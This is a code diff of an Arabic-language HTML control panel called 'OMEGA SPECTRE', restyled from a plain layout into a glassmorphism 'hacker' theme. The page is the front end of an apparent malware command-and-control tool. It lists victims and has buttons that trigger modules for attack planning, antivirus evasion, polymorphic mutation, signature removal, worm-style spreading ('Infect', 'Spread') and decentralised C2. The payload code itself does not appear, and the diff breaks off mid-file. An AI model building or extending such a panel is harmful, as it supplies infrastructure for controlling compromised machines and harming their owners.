@@ -1,723 +1,1042 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OMEGA SPECTRE C2 - CONTROL PANEL</title>
+    <title>☠️ OMEGA SPECTRE — GLASS HACKER PANEL</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
-        .header { text-align: center; padding: 20px; border-bottom: 2px solid #00ff00; margin-bottom: 30px; }
-        .header h1 { color: #ff0044; font-size: 28px; text-shadow: 0 0 20px #ff004488; }
-        .header p { color: #00ff00; font-size: 14px; }
-        .stats { display: flex; gap: 20px; justify-content: center; margin-bottom: 30px; flex-wrap: wrap; }
-        .stat-card { background: #111; padding: 15px 25px; border-radius: 10px; border: 1px solid #00ff0055; text-align: center; }
-        .stat-card h3 { color: #888; font-size: 12px; }
-        .stat-card .value { color: #00ff00; font-size: 24px; }
-        .category { background: #111; border-radius: 10px; padding: 20px; margin-bottom: 20px; border: 1px solid #222; }
-        .category h2 { color: #ff0044; font-size: 18px; margin-bottom: 15px; border-bottom: 1px solid #222; padding-bottom: 10px; }
-        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; }
-        .file-card { background: #1a1a1a; border-radius: 8px; padding: 15px; border: 1px solid #333; transition: 0.3s; }
-        .file-card:hover { border-color: #00ff00; }
-        .file-card .file-name { color: #00ff00; font-size: 14px; margin-bottom: 8px; }
-        .file-card .file-path { color: #666; font-size: 11px; margin-bottom: 10px; }
-        .btn-group { display: flex; flex-wrap: wrap; gap: 8px; }
-        .btn { padding: 6px 12px; border: none; border-radius: 5px; font-size: 11px; cursor: pointer; transition: 0.3s; font-family: inherit; }
-        .btn-execute { background: #00ff00; color: #0a0a0a; }
-        .btn-execute:hover { background: #00cc00; transform: scale(1.05); }
-        .btn-burn { background: #ff0044; color: #fff; }
-        .btn-burn:hover { background: #cc0033; transform: scale(1.05); }
-        .btn-scan { background: #0066ff; color: #fff; }
-        .btn-scan:hover { background: #0055cc; transform: scale(1.05); }
-        .btn-hijack { background: #ff8800; color: #fff; }
-        .btn-hijack:hover { background: #cc6600; transform: scale(1.05); }
-        .btn-kill { background: #8800ff; color: #fff; }
-        .btn-kill:hover { background: #6600cc; transform: scale(1.05); }
-        .btn-encrypt { background: #00ccff; color: #0a0a0a; }
-        .btn-encrypt:hover { background: #0099cc; transform: scale(1.05); }
-        .footer { text-align: center; padding: 20px; color: #444; font-size: 12px; border-top: 1px solid #222; margin-top: 30px; }
-        .victim-select { background: #1a1a1a; color: #00ff00; border: 1px solid #00ff00; padding: 8px 12px; border-radius: 5px; margin-bottom: 15px; width: 100%; max-width: 300px; }
-        .status-bar { background: #111; padding: 10px 20px; border-radius: 8px; margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; }
-        .status-bar .online { color: #00ff00; }
-        .status-bar .offline { color: #ff0044; }
-        .command-log { background: #0a0a0a; border: 1px solid #222; border-radius: 8px; padding: 15px; max-height: 200px; overflow-y: auto; font-size: 12px; margin-top: 20px; }
-        .command-log .log-entry { padding: 3px 0; border-bottom: 1px solid #111; }
-        .command-log .log-entry .time { color: #666; margin-right: 10px; }
-        .command-log .log-entry .success { color: #00ff00; }
-        .command-log .log-entry .error { color: #ff0044; }
+        /* ============================================================ */
+        /*  🔥 BASE — GLASSMORPHISM + HACKER STYLE                     */
+        /* ============================================================ */
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Share Tech Mono', 'Courier New', monospace;
+            background: #0a0a0f;
+            color: #00ff41;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* ============================================================ */
+        /*  🔥 MATRIX BACKGROUND                                         */
+        /* ============================================================ */
+        #matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            background: #0a0a0f;
+            overflow: hidden;
+        }
+        #matrix-bg canvas {
+            display: block;
+            width: 100%;
+            height: 100%;
+        }
+
+        /* ============================================================ */
+        /*  🔥 FLOATING HACKER SYMBOLS                                   */
+        /* ============================================================ */
+        .hacker-symbols {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        .hacker-symbols span {
+            position: absolute;
+            color: #00ff4133;
+            font-size: 22px;
+            animation: floatSymbol 25s infinite linear;
+            opacity: 0;
+        }
+        @keyframes floatSymbol {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.7;
+            }
+            90% {
+                opacity: 0.7;
+            }
+            100% {
+                transform: translateY(-10vh) rotate(720deg);
+                opacity: 0;
+            }
+        }
+        .hacker-symbols span:nth-child(1) {
+            left: 5%;
+            animation-duration: 18s;
+            font-size: 28px;
+        }
+        .hacker-symbols span:nth-child(2) {
+            left: 15%;
+            animation-duration: 22s;
+            font-size: 18px;
+            animation-delay: 2s;
+        }
+        .hacker-symbols span:nth-child(3) {
+            left: 25%;
+            animation-duration: 20s;
+            font-size: 32px;
+            animation-delay: 4s;
+        }
+        .hacker-symbols span:nth-child(4) {
+            left: 35%;
+            animation-duration: 26s;
+            font-size: 16px;
+            animation-delay: 1s;
+        }
+        .hacker-symbols span:nth-child(5) {
+            left: 45%;
+            animation-duration: 19s;
+            font-size: 24px;
+            animation-delay: 3s;
+        }
+        .hacker-symbols span:nth-child(6) {
+            left: 55%;
+            animation-duration: 23s;
+            font-size: 20px;
+            animation-delay: 5s;
+        }
+        .hacker-symbols span:nth-child(7) {
+            left: 65%;
+            animation-duration: 21s;
+            font-size: 30px;
+            animation-delay: 2s;
+        }
+        .hacker-symbols span:nth-child(8) {
+            left: 75%;
+            animation-duration: 24s;
+            font-size: 14px;
+            animation-delay: 4s;
+        }
+        .hacker-symbols span:nth-child(9) {
+            left: 85%;
+            animation-duration: 17s;
+            font-size: 26px;
+            animation-delay: 1s;
+        }
+        .hacker-symbols span:nth-child(10) {
+            left: 95%;
+            animation-duration: 28s;
+            font-size: 34px;
+            animation-delay: 3s;
+        }
+
+        /* ============================================================ */
+        /*  🔥 MAIN CONTAINER — GLASS BACKGROUND                        */
+        /* ============================================================ */
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 1440px;
+            margin: 0 auto;
+            padding: 16px 20px;
+        }
+
+        /* ============================================================ */
+        /*  🔥 GLASS CARD — BASE STYLE                                  */
+        /* ============================================================ */
+        .glass {
+            background: rgba(10, 10, 20, 0.35);
+            backdrop-filter: blur(16px) saturate(180%);
+            -webkit-backdrop-filter: blur(16px) saturate(180%);
+            border: 1px solid rgba(0, 255, 65, 0.15);
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            transition: all 0.3s ease;
+        }
+        .glass:hover {
+            border-color: rgba(0, 255, 65, 0.3);
+            box-shadow: 0 8px 40px rgba(0, 255, 65, 0.05), 0 8px 32px rgba(0, 0, 0, 0.6);
+        }
+
+        /* ============================================================ */
+        /*  🔥 HEADER — GLASS                                           */
+        /* ============================================================ */
+        .header {
+            text-align: center;
+            padding: 24px;
+            margin-bottom: 24px;
+        }
+        .header h1 {
+            font-size: 44px;
+            color: #ff0040;
+            text-shadow: 0 0 30px #ff004066, 0 0 60px #ff004033;
+            animation: glitchText 3s infinite;
+            letter-spacing: 6px;
+        }
+        @keyframes glitchText {
+            0%,
+            95%,
+            100% {
+                text-shadow: 0 0 30px #ff004066;
+            }
+            96% {
+                text-shadow: -6px 0 #00ff41, 6px 0 #ff0040;
+                transform: skewX(-2deg);
+            }
+            97% {
+                text-shadow: 6px 0 #00ff41, -6px 0 #ff0040;
+                transform: skewX(2deg);
+            }
+        }
+        .header .subtitle {
+            color: #00ff41;
+            font-size: 16px;
+            letter-spacing: 4px;
+            opacity: 0.7;
+            animation: blink 1.5s infinite;
+        }
+        .header .subtitle::before {
+            content: '> ';
+            color: #00ff41;
+            opacity: 0.5;
+        }
+        @keyframes blink {
+            0%,
+            100% {
+                opacity: 0.7;
+            }
+            50% {
+                opacity: 0.3;
+            }
+        }
+
+        /* ============================================================ */
+        /*  🔥 GLASS STATUS BAR                                         */
+        /* ============================================================ */
+        .status-bar {
+            display: flex;
+            justify-content: space-between;
+            padding: 14px 22px;
+            margin-bottom: 16px;
+            flex-wrap: wrap;
+            gap: 8px;
+            font-size: 13px;
+        }
+        .status-bar .item {
+            color: #00ff4166;
+        }
+        .status-bar .item span {
+            color: #00ff41;
+        }
+        .status-bar .item .online {
+            color: #00ff41;
+            animation: pulse 1.5s infinite;
+        }
+        .status-bar .item .offline {
+            color: #ff0040;
+        }
+        @keyframes pulse {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.3;
+            }
+        }
+
+        /* ============================================================ */
+        /*  🔥 GLASS BUTTONS — GLASSMORPHISM + HACKER                   */
+        /* ============================================================ */
+        .glass-btn {
+            position: relative;
+            padding: 10px 26px;
+            border: none;
+            background: rgba(0, 255, 65, 0.05);
+            backdrop-filter: blur(12px) saturate(180%);
+            -webkit-backdrop-filter: blur(12px) saturate(180%);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            border-radius: 12px;
+            color: #00ff41;
+            font-family: 'Share Tech Mono', 'Courier New', monospace;
+            font-size: 13px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+        }
+        .glass-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            border-radius: 12px;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.05), transparent);
+            pointer-events: none;
+        }
+        .glass-btn:hover {
+            background: rgba(0, 255, 65, 0.12);
+            border-color: rgba(0, 255, 65, 0.5);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 32px rgba(0, 255, 65, 0.1), 0 4px 16px rgba(0, 0, 0, 0.3);
+        }
+        .glass-btn .btn-text {
+            position: relative;
+            z-index: 2;
+            text-shadow: 0 0 10px currentColor;
+        }
+        .glass-btn.glitch:hover {
+            animation: glitchBtn 0.3s infinite;
+        }
+        @keyframes glitchBtn {
+            0% {
+                transform: translate(0);
+            }
+            20% {
+                transform: translate(-2px, 2px);
+            }
+            40% {
+                transform: translate(2px, -2px);
+            }
+            60% {
+                transform: translate(-2px, -2px);
+            }
+            80% {
+                transform: translate(2px, 2px);
+            }
+            100% {
+                transform: translate(0);
+            }
+        }
+        .glass-btn.terminal::before {
+            content: '> ';
+            color: #00ff41;
+            opacity: 0.5;
+            position: relative;
+        }
+        /* Colors */
+        .glass-btn.green {
+            color: #00ff41;
+        }
+        .glass-btn.green .btn-text {
+            text-shadow: 0 0 10px #00ff41;
+        }
+        .glass-btn.blue {
+            color: #0088ff;
+        }
+        .glass-btn.blue .btn-text {
+            text-shadow: 0 0 10px #0088ff;
+        }
+        .glass-btn.orange {
+            color: #ff8800;
+        }
+        .glass-btn.orange .btn-text {
+            text-shadow: 0 0 10px #ff8800;
+        }
+        .glass-btn.red {
+            color: #ff0040;
+        }
+        .glass-btn.red .btn-text {
+            text-shadow: 0 0 10px #ff0040;
+        }
+        .glass-btn.purple {
+            color: #aa44ff;
+        }
+        .glass-btn.purple .btn-text {
+            text-shadow: 0 0 10px #aa44ff;
+        }
+        .glass-btn.gold {
+            color: #ffaa00;
+        }
+        .glass-btn.gold .btn-text {
+            text-shadow: 0 0 10px #ffaa00;
+        }
+
+        /* ============================================================ */
+        /*  🔥 QUICK ACTIONS — GLASS                                    */
+        /* ============================================================ */
+        .quick-actions {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            justify-content: center;
+            padding: 16px;
+            margin-bottom: 16px;
+        }
+
+        /* ============================================================ */
+        /*  🔥 MODULE GRID — GLASS CARDS                                */
+        /* ============================================================ */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 14px;
+        }
+        .card {
+            padding: 18px;
+            transition: all 0.3s ease;
+        }
+        .card:hover {
+            border-color: rgba(0, 255, 65, 0.4);
+            transform: translateY(-4px);
+            box-shadow: 0 8px 40px rgba(0, 255, 65, 0.05), 0 8px 32px rgba(0, 0, 0, 0.6);
+        }
+        .card h3 {
+            font-size: 16px;
+            color: #00ff41;
+            margin-bottom: 4px;
+        }
+        .card .desc {
+            font-size: 12px;
+            color: #00ff4166;
+            margin-bottom: 8px;
+        }
+        .card .path {
+            font-size: 10px;
+            color: #00ff4133;
+            margin-bottom: 10px;
+            font-family: 'Share Tech Mono', monospace;
+        }
+        .card .btn-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+        }
+        .card .btn-group .glass-btn {
+            padding: 6px 14px;
+            font-size: 11px;
+        }
+
+        /* ============================================================ */
+        /*  🔥 GLASS COMMAND LOG                                        */
+        /* ============================================================ */
+        .log-section {
+            margin-top: 16px;
+            padding: 16px;
+        }
+        .log-section h2 {
+            color: #00ff41;
+            font-size: 16px;
+            margin-bottom: 8px;
+            font-family: 'Share Tech Mono', monospace;
+        }
+        .log-section h2::before {
+            content: '> ';
+            color: #00ff41;
+            opacity: 0.5;
+        }
+        .log-box {
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(8px);
+            border-radius: 10px;
+            padding: 12px;
+            max-height: 180px;
+            overflow-y: auto;
+            font-size: 12px;
+            border: 1px solid rgba(0, 255, 65, 0.1);
+            font-family: 'Share Tech Mono', monospace;
+        }
+        .log-box .entry {
+            padding: 3px 0;
+            border-bottom: 1px solid rgba(0, 255, 65, 0.05);
+            color: #00ff4188;
+        }
+        .log-box .entry .time {
+            color: #00ff4133;
+            margin-left: 10px;
+        }
+        .log-box .entry .success {
+            color: #00ff41;
+        }
+        .log-box .entry .error {
+            color: #ff0040;
+        }
+        .log-box .entry .info {
+            color: #0088ff;
+        }
+        .log-box .entry .warning {
+            color: #ffaa00;
+        }
+
+        /* ============================================================ */
+        /*  🔥 GLASS FOOTER                                             */
+        /* ============================================================ */
+        .footer {
+            text-align: center;
+            padding: 16px;
+            margin-top: 20px;
+            color: #00ff4133;
+            font-size: 11px;
+            font-family: 'Share Tech Mono', monospace;
+        }
+
+        /* ============================================================ */
+        /*  🔥 GLASS MODAL                                              */
+        /* ============================================================ */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(12px);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal.active {
+            display: flex;
+        }
+        .modal-content {
+            background: rgba(10, 10, 20, 0.5);
+            backdrop-filter: blur(20px) saturate(180%);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            border-radius: 16px;
+            padding: 28px;
+            max-width: 750px;
+            width: 95%;
+            max-height: 80vh;
+            overflow-y: auto;
+            font-family: 'Share Tech Mono', monospace;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.8);
+        }
+        .modal-content .close {
+            float: left;
+            background: transparent;
+            border: none;
+            color: #ff0040;
+            font-size: 28px;
+            cursor: pointer;
+            font-family: 'Share Tech Mono', monospace;
+        }
+        .modal-content .close:hover {
+            color: #ff0040;
+            text-shadow: 0 0 20px #ff0040;
+        }
+        .modal-content h2 {
+            color: #ff0040;
+            margin-bottom: 14px;
+            font-size: 20px;
+        }
+        .modal-content h2::before {
+            content: '# ';
+            color: #00ff41;
+            opacity: 0.4;
+        }
+        .modal-content pre {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 14px;
+            border-radius: 10px;
+            overflow-x: auto;
+            font-size: 12px;
+            color: #00ff41;
+            border: 1px solid rgba(0, 255, 65, 0.1);
+            max-height: 400px;
+            overflow-y: auto;
+            font-family: 'Share Tech Mono', monospace;
+        }
+
+        /* ============================================================ */
+        /*  🔥 SCROLLBAR                                                */
+        /* ============================================================ */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: rgba(0, 0, 0, 0.3);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #00ff4133;
+            border-radius: 10px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #00ff4166;
+        }
+
+        /* ============================================================ */
+        /*  🔥 RESPONSIVE                                               */
+        /* ============================================================ */
+        @media (max-width: 768px) {
+            .grid {
+                grid-template-columns: 1fr;
+            }
+            .status-bar {
+                flex-direction: column;
+                font-size: 11px;
+            }
+            .quick-actions {
+                flex-direction: column;
+                align-items: center;
+            }
+            .header h1 {
+                font-size: 26px;
+                letter-spacing: 3px;
+            }
+            .glass-btn {
+                padding: 8px 16px;
+                font-size: 11px;
+                width: 100%;
+                text-align: center;
+            }
+            .card .btn-group .glass-btn {
+                font-size: 10px;
+                padding: 4px 10px;
+            }
+        }
+        @media (max-width: 480px) {
+            .header h1 {
+                font-size: 20px;
+                letter-spacing: 2px;
+            }
+            .header .subtitle {
+                font-size: 12px;
+            }
+            .container {
+                padding: 10px;
+            }
+            .modal-content {
+                padding: 16px;
+            }
+        }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <h1>☠️ OMEGA SPECTRE C2</h1>
-    <p>Ultimate Control Panel — All Files Under Your Command</p>
-</div>
+    <!-- ============================================================ -->
+    <!--  🔥 MATRIX BACKGROUND                                         -->
+    <!-- ============================================================ -->
+    <div id="matrix-bg">
+        <canvas id="matrixCanvas"></canvas>
+    </div>
 
-<div class="stats" id="stats">
-    <div class="stat-card"><h3>Total Victims</h3><div class="value" id="totalVictims">0</div></div>
-    <div class="stat-card"><h3>Active Victims</h3><div class="value" id="activeVictims">0</div></div>
-    <div class="stat-card"><h3>Total Files</h3><div class="value" id="totalFiles">165</div></div>
-    <div class="stat-card"><h3>Commands Sent</h3><div class="value" id="commandsSent">0</div></div>
-</div>
+    <!-- ============================================================ -->
+    <!--  🔥 FLOATING HACKER SYMBOLS                                   -->
+    <!-- ============================================================ -->
+    <div class="hacker-symbols">
+        <span>☠️</span><span>💀</span><span>👾</span><span>🔥</span><span>⚡</span>
+        <span>🖥️</span><span>🔓</span><span>💻</span><span>🔐</span><span>🚀</span>
+        <span>🛸</span><span>💣</span><span>📡</span><span>🔮</span><span>🧠</span>
+        <span>🕸️</span><span>🌐</span><span>🔥</span><span>⚡</span><span>💀</span>
+        <span>☠️</span><span>👾</span><span>🔓</span><span>🖥️</span><span>💻</span>
+    </div>
 
-<div class="status-bar">
-    <span>🟢 Server: <span class="online">Online</span></span>
-    <span>📡 C2: <span class="online">Active</span></span>
-    <span>🎯 Target: <span id="selectedVictim">None</span></span>
-</div>
+    <!-- ============================================================ -->
+    <!--  🔥 MAIN CONTENT                                             -->
+    <!-- ============================================================ -->
+    <div class="container">
 
-<div>
-    <label style="color:#888;font-size:12px;">Select Victim:</label>
-    <select class="victim-select" id="victimSelect" onchange="updateSelectedVictim()">
-        <option value="all">All Victims</option>
-        <option value="victim_001">Victim_001</option>
-        <option value="victim_002">Victim_002</option>
-    </select>
-</div>
+        <!-- ============================================================ -->
+        <!--  HEADER — GLASS                                              -->
+        <!-- ============================================================ -->
+        <div class="header glass">
+            <h1>☠️ OMEGA SPECTRE</h1>
+            <div class="subtitle">ULTIMATE HACKER CONTROL PANEL — ALL FILES UNDER YOUR COMMAND</div>
+        </div>
 
-<!-- ============================================================ -->
-<!-- QUANTUM CORE -->
-<!-- ============================================================ -->
-<div class="category">
-    <h2>⚛️ QUANTUM CORE (512-bit)</h2>
-    <div class="file-grid">
-        <div class="file-card">
-            <div class="file-name">q_engine.py</div>
-            <div class="file-path">quantum_core/q_engine.py</div>
-            <div class="btn-group">
-                <button class="btn btn-encrypt" onclick="sendCommand('quantum_core/q_engine.py --encrypt')">🔐 Encrypt</button>
-                <button class="btn btn-execute" onclick="sendCommand('quantum_core/q_engine.py --decrypt')">🔓 Decrypt</button>
-                <button class="btn btn-execute" onclick="sendCommand('quantum_core/q_engine.py --generate')">⚡ Generate</button>
+        <!-- ============================================================ -->
+        <!--  STATUS BAR — GLASS                                          -->
+        <!-- ============================================================ -->
+        <div class="status-bar glass">
+            <div class="item">🚀 STATUS: <span class="online" id="statusText">ONLINE</span></div>
+            <div class="item">📦 FILES: <span id="fileCount">165</span></div>
+            <div class="item">📂 MODULES: <span id="folderCount">18</span></div>
+            <div class="item">🎯 VICTIMS: <span id="victimCount">0</span></div>
+            <div class="item">⏱️ UPTIME: <span id="uptime">00:00:00</span></div>
+            <div class="item">🧠 MEMORY: <span id="memoryUsage">0%</span></div>
+            <div class="item">💻 CPU: <span id="cpuUsage">0%</span></div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!--  QUICK ACTIONS — GLASS BUTTONS                              -->
+        <!-- ============================================================ -->
+        <div class="quick-actions glass">
+            <button class="glass-btn green terminal" onclick="activateAll()">
+                <span class="btn-text">🚀 ACTIVATE ALL</span>
+            </button>
+            <button class="glass-btn blue glitch" onclick="getStatus()">
+                <span class="btn-text">📊 STATUS</span>
+            </button>
+            <button class="glass-btn red terminal" onclick="stopAll()">
+                <span class="btn-text">⛔ STOP ALL</span>
+            </button>
+            <button class="glass-btn blue" onclick="refreshStatus()">
+                <span class="btn-text">🔄 REFRESH</span>
+            </button>
+            <button class="glass-btn gold glitch" onclick="copyLink()">
+                <span class="btn-text">📋 COPY LINK</span>
+            </button>
+            <button class="glass-btn purple terminal" onclick="showVictims()">
+                <span class="btn-text">🎯 VICTIMS</span>
+            </button>
+            <button class="glass-btn orange glitch" onclick="scanNetwork()">
+                <span class="btn-text">📡 SCAN</span>
+            </button>
+            <button class="glass-btn red" onclick="killAll()">
+                <span class="btn-text">💀 KILL ALL</span>
+            </button>
+        </div>
+
+        <!-- ============================================================ -->
+        <!--  MODULE GRID — GLASS CARDS                                   -->
+        <!-- ============================================================ -->
+        <div class="grid" id="moduleGrid">
+            <!-- سيتم تعبئتها بواسطة JavaScript -->
+        </div>
+
+        <!-- ============================================================ -->
+        <!--  COMMAND LOG — GLASS                                         -->
+        <!-- ============================================================ -->
+        <div class="log-section glass">
+            <h2>COMMAND LOG</h2>
+            <div class="log-box" id="logBox">
+                <div class="entry"><span class="time">[SYS]</span> <span class="success">✅ OMEGA SPECTRE ACTIVATED</span></div>
             </div>
         </div>
-        <div class="file-card">
-            <div class="file-name">q_random.py</div>
-            <div class="file-path">quantum_core/q_random.py</div>
-            <div class="btn-group">
-                <button class="btn btn-encrypt" onclick="sendCommand('quantum_core/q_random.py --generate')">🎲 Generate</button>
-                <button class="btn btn-execute" onclick="sendCommand('quantum_core/q_random.py --seed')">🌱 Seed</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">q_entanglement.py</div>
-            <div class="file-path">quantum_core/q_entanglement.py</div>
-            <div class="btn-group">
-                <button class="btn btn-encrypt" onclick="sendCommand('quantum_core/q_entanglement.py --entangle')">🌀 Entangle</button>
-                <button class="btn btn-execute" onclick="sendCommand('quantum_core/q_entanglement.py --measure')">📊 Measure</button>
-            </div>
+
+        <!-- ============================================================ -->
+        <!--  FOOTER — GLASS                                              -->
+        <!-- ============================================================ -->
+        <div class="footer glass">
+            ☠️ OMEGA SPECTRE GODFALL — v∞.∞.∞ — ALL RIGHTS RESERVED TO THE VOID
         </div>
     </div>
-</div>
 
-<!-- ============================================================ -->
-<!-- AI AUTOPILOT -->
-<!-- ============================================================ -->
-<div class="category">
-    <h2>🧠 AI AUTOPILOT</h2>
-    <div class="file-grid">
-        <div class="file-card">
-            <div class="file-name">neural_selector.py</div>
-            <div class="file-path">ai_autopilot/neural_selector.py</div>
-            <div class="btn-group">
-                <button class="btn btn-scan" onclick="sendCommand('ai_autopilot/neural_selector.py --scan')">🔍 Scan</button>
-                <button class="btn btn-execute" onclick="sendCommand('ai_autopilot/neural_selector.py --select')">🎯 Select</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">attack_planner.py</div>
-            <div class="file-path">ai_autopilot/attack_planner.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('ai_autopilot/attack_planner.py --plan')">📋 Plan</button>
-                <button class="btn btn-execute" onclick="sendCommand('ai_autopilot/attack_planner.py --execute')">⚡ Execute</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">evasion_learner.py</div>
-            <div class="file-path">ai_autopilot/evasion_learner.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('ai_autopilot/evasion_learner.py --learn')">📖 Learn</button>
-                <button class="btn btn-execute" onclick="sendCommand('ai_autopilot/evasion_learner.py --evade')">👻 Evade</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">self_improve.py</div>
-            <div class="file-path">ai_autopilot/self_improve.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('ai_autopilot/self_improve.py --improve')">📈 Improve</button>
-                <button class="btn btn-execute" onclick="sendCommand('ai_autopilot/self_improve.py --mutate')">🧬 Mutate</button>
-            </div>
+    <!-- ============================================================ -->
+    <!--  🔥 GLASS MODAL                                               -->
+    <!-- ============================================================ -->
+    <div class="modal" id="modal">
+        <div class="modal-content">
+            <button class="close" onclick="closeModal()">✕</button>
+            <h2 id="modalTitle">RESULT</h2>
+            <div id="modalBody"></div>
         </div>
     </div>
-</div>
 
-<!-- ============================================================ -->
-<!-- MUTATION ENGINE -->
-<!-- ============================================================ -->
-<div class="category">
-    <h2>🧬 MUTATION ENGINE</h2>
-    <div class="file-grid">
-        <div class="file-card">
-            <div class="file-name">polymorphic_gen.py</div>
-            <div class="file-path">mutation_engine/polymorphic_gen.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('mutation_engine/polymorphic_gen.py --mutate')">🔄 Mutate</button>
-                <button class="btn btn-execute" onclick="sendCommand('mutation_engine/polymorphic_gen.py --generate')">⚡ Generate</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">metamorphic_asm.py</div>
-            <div class="file-path">mutation_engine/metamorphic_asm.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('mutation_engine/metamorphic_asm.py --transform')">🔄 Transform</button>
-                <button class="btn btn-execute" onclick="sendCommand('mutation_engine/metamorphic_asm.py --asm')">⚡ ASM</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">signature_killer.py</div>
-            <div class="file-path">mutation_engine/signature_killer.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('mutation_engine/signature_killer.py --kill')">💀 Kill</button>
-                <button class="btn btn-execute" onclick="sendCommand('mutation_engine/signature_killer.py --wipe')">🧹 Wipe</button>
-            </div>
-        </div>
-    </div>
-</div>
+    <!-- ============================================================ -->
+    <!--  🔥 JAVASCRIPT — MATRIX RAIN + FULL CONTROL                  -->
+    <!-- ============================================================ -->
+    <script>
+        // ============================================================
+        //  🔥 MATRIX RAIN
+        // ============================================================
+        (function matrixRain() {
+            const canvas = document.getElementById('matrixCanvas');
+            const ctx = canvas.getContext('2d');
+            let width = canvas.width = window.innerWidth;
+            let height = canvas.height = window.innerHeight;
 
-<!-- ============================================================ -->
-<!-- MESH NETWORK -->
-<!-- ============================================================ -->
-<div class="category">
-    <h2>🕸️ MESH NETWORK</h2>
-    <div class="file-grid">
-        <div class="file-card">
-            <div class="file-name">p2p_comm.py</div>
-            <div class="file-path">mesh_network/p2p_comm.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('mesh_network/p2p_comm.py --connect')">🔗 Connect</button>
-                <button class="btn btn-execute" onclick="sendCommand('mesh_network/p2p_comm.py --broadcast')">📢 Broadcast</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">zombie_spreader.py</div>
-            <div class="file-path">mesh_network/zombie_spreader.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('mesh_network/zombie_spreader.py --spread')">🧟 Spread</button>
-                <button class="btn btn-execute" onclick="sendCommand('mesh_network/zombie_spreader.py --infect')">🦠 Infect</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">decentralized_c2.py</div>
-            <div class="file-path">mesh_network/decentralized_c2.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('mesh_network/decentralized_c2.py --deploy')">🚀 Deploy</button>
-                <button class="btn btn-execute" onclick="sendCommand('mesh_network/decentralized_c2.py --control')">🎮 Control</button>
-            </div>
-        </div>
-    </div>
-</div>
+            const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+-=[]{}|;:,.<>?/';
+            const columns = Math.floor(width / 16);
+            const drops = new Array(columns).fill(1);
 
-<!-- ============================================================ -->
-<!-- MILITARY JAMMING -->
-<!-- ============================================================ -->
-<div class="category">
-    <h2>📡 MILITARY JAMMING</h2>
-    <div class="file-grid">
-        <div class="file-card">
-            <div class="file-name">freq_jammer.py</div>
-            <div class="file-path">military_jamming/freq_jammer.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('military_jamming/freq_jammer.py --jam')">📡 Jam</button>
